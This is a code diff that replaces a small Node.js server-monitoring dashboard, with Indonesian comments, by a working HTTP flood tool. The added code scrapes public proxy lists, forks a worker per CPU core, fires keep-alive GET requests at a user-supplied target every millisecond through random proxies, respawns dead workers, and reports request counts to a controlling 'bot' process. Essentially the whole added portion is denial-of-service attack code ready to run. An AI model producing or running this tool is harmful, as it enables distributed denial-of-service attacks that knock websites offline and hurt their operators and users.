@@ -1,38 +1,64 @@
-// Simpan sebagai server.js
-// Jalankan: npm install express socket.io systeminformation
-const express = require('express');
-const app = express();
-const http = require('http').Server(app);
-const io = require('socket.io')(http);
-const si = require('systeminformation');
+const http = require('node:http');
+const https = require('node:https');
+const cluster = require('node:cluster');
+const os = require('node:os');
 
-app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/index.html');
-});
+const target = process.argv[2];
+const numCPUs = os.cpus().length;
 
-io.on('connection', (socket) => {
-    console.log('Client terhubung ke monitoring');
+if (cluster.isPrimary) {
+    let totalRequests = 0;
 
-    // Interval pengiriman data setiap 1 detik
-    const interval = setInterval(async () => {
-        try {
-            const load = await si.currentLoad();
-            const mem = await si.mem();
-            const net = await si.networkStats();
+    // Ambil Proxy
+    async function getProxies() {
+        return new Promise((resolve) => {
+            https.get(`https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all`, (res) => {
+                let data = '';
+                res.on('data', (c) => data += c);
+                res.on('end', () => resolve(data.split(/\r?\n/).filter(l => l.includes(':'))));
+            }).on('error', () => resolve([]));
+        });
+    }
 
-            socket.emit('stats_update', {
-                cpu: load.currentLoad.toFixed(1),
-                ram: ((mem.active / mem.total) * 100).toFixed(1),
-                netRecv: (net[0].rx_sec / 1024 / 1024).toFixed(2), // Convert ke MB
-                netSend: (net[0].tx_sec / 1024 / 1024).toFixed(2)  // Convert ke MB
-            });
-        } catch (e) { console.log(e); }
-    }, 1000);
+    getProxies().then(proxies => {
+        for (let i = 0; i < numCPUs; i++) {
+            cluster.fork().send({ type: 'init', proxies });
+        }
+    });
 
-    socket.on('disconnect', () => clearInterval(interval));
-});
+    // Kirim Log ke Bot (IPC)
+    cluster.on('message', (worker, msg) => {
+        if (msg.type === 'count') {
+            totalRequests += msg.value;
+            if (process.send) {
+                process.send({ type: 'log', total: totalRequests, target: target });
+            }
+        }
+    });
 
-http.listen(3000, () => {
-    console.log('Monitor berjalan di http://localhost:3000');
-});
+    cluster.on('exit', () => cluster.fork());
+} else {
+    let list = [];
+    process.on('message', (m) => { if(m.type === 'init') list = m.proxies; });
+
+    function flood() {
+        if (list.length === 0) return;
+        const proxy = list[Math.floor(Math.random() * list.length)];
+        const [h, p] = proxy.split(':');
+        const isHttps = target.startsWith('https');
+        const agent = isHttps ? new https.Agent({ keepAlive: true }) : new http.Agent({ keepAlive: true });
+
+        const req = (isHttps ? https : http).request({
+            host: h, port: p, path: target, method: 'GET', agent: agent,
+            headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' }
+        }, (res) => {
+            process.send({ type: 'count', value: 1 });
+            res.on('data', () => {});
+            res.on('end', () => req.destroy());
+        });
+        req.on('error', () => req.destroy());
+        req.end();
+    }
+    setInterval(flood, 1);
+}
 
